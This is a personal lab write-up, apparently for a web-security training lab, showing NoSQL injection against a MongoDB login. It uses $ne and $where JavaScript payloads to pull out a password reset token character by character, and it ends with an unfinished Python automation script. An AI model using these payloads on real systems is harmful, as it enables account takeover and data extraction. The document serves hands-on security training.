The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, log in as `carlos`.

---

Goal: log in as Carlos

![[IMG/Pasted image 20240921040622.png]]
In Repeater, change the value of the password parameter from `"invalid"` to `{"$ne":"invalid"}`, then send the request. Notice that you now receive an `Account locked` error message. You can't access Carlos's account, but this response indicates that the `$ne` operator has been accepted and the application is vulnerable.

- In Burp's browser, attempt to reset the password for the `carlos` account. When you submit the `carlos` username, observe that the reset mechanism involves email verification, so you can't reset the account yourself.
    
- In Repeater, use the `POST /login` request to test whether the application is vulnerable to JavaScript injection:
    
    1. Add `"$where": "0"` as an additional parameter in the JSON data as follows: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`
    2. Send the request. Notice that you receive an `Invalid username or password` error message.
    3. Change `"$where": "0" to "$where": "1"`, then resend the request. Notice that you receive an `Account locked` error message. This indicates that the JavaScript in the `$where` clause is being evaluated.

![[IMG/Pasted image 20240921054622.png]]

Construct an attack to identify all the fields on the user object:

1. Update the `$where` parameter as follows: `"$where":"Object.keys(this)[1].match('^.{}.*')"`
2. Add two payload positions. The first identifies the character position number, and the second identifies the character itself: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`


```php
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
```

```php
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "Object.keys(this)[1].match('^.{}.*')"}
```

```php
{"username":"carlos","password":{"$ne":"invalid"}, "$where": "Object.keys(this)[1].match('^.{}.*')"}
```

```php
"$where":"Object.keys(this)[1].match('^.{<POSITION>}<CHR>.*')"
```

```php
"$where":"Object.keys(this)[1].match('^.{1}a.*')"
```

To identify further JSON parameters. You can do this by incrementing the index of the keys array with each attempt, for example: `"$where":"Object.keys(this[2].match('^.{}.*')"`

Notice that one of the JSON parameters is for a password reset token.

- Identify the `GET /forgot-password` request as a potentially interesting endpoint, as it relates to the password reset functionality. Right-click the request and select **Send to Repeater**.

![[IMG/Pasted image 20240921042948.png]]

-  In Repeater, submit an invalid field in the URL: `GET /forgot-password?foo=invalid`. Notice that the response is identical to the original response.
-  Submit the exfiltrated name of the password reset token field in the URL: `GET /forgot-password?YOURTOKENNAME=invalid`. Notice that you receive an `Invalid token` error message. This confirms that you have the correct token name and endpoint.
- In Intruder, use the `POST /login` request to construct an attack that extracts the value of Carlos's password reset token:
    
    1. Keep the settings from your previous attack, but update the `$where` parameter as follows: `"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"`
        
        Make sure that you replace `YOURTOKENNAME` with the password reset token name that you exfiltrated in the previous step.
        
    2. Click **Start attack**.
    3. Sort the attack results by **Payload 1**, then **Length**, to identify responses with an `Account locked` message instead of the `Invalid username or password` message. Note the letters from the **Payload 2** column down.
- In Repeater, submit the value of the password reset token in the URL of the `GET / forgot-password` request: `GET /forgot-password?YOURTOKENNAME=TOKENVALUE`.

---

Script details.

Error message: `Account locked: please reset your password`

- Find token name
- Use token name to get token value
- Does need a csrf

```php
"$where": "function(){ if(Object.keys(this)[3].match(/^X/) ) return 1; else 0; }"
```
- Value to change `X`
 
 Password field:

```php
{"$ne":"invalid"}
```

Full payload:

```php
{"username":"carlos","password":{"$ne":""}, "$where": "function(){ if(object.keys(this)[3].match(/^X/) ) return 1; else 0; }"}
```
- Is case sensitive, (changed `object` to `Object`) and now i'm getting the correct server response.

Change the x position to find the token name.

Then i can move onto the next part of the exploit. 
_unfinished_
- needs a csrf but it looks like it needs it as the `cookie:` 
```php
#!/usr/bin/python3

import sys
import requests
import urllib3
from bs4 import BeautifulSoup 


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# Get csrf
def get_csrf(s, url):
	r = s.get(url + 'login', verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	csrf = soup.find("input")['value']
	print(f'The csrf is: {csrf}')
	return csrf
	

# Brute-Force the token name
def get_token_name(s, url):
	csrf = get_csrf(s, url)
	data = {
		"username": "carlos",
		"password": {"$ne":"invalid"},
		"$where": "function(){ if(Object.keys(this)[3].match(/^e/) ) return 1; else 0; }"
	}
	
	r = s.post(url + 'login', data=data, verify=False, proxies=proxies)
	print("done")



# Print user intructions
def main():
	if len(sys.argv) != 2:
		print("[+] Usage: %s <URL>" % sys.argv[0])
		print("[+] Example: %s www.example.com/" % sys.argv[0])
		sys.exit(-1)
		
	print("[+] Trying to find the token name...")
	
	s = requests.Session()
	url = sys.argv[1]
	get_token_name(s, url)
	
if __name__ == '__main__':
	main()
```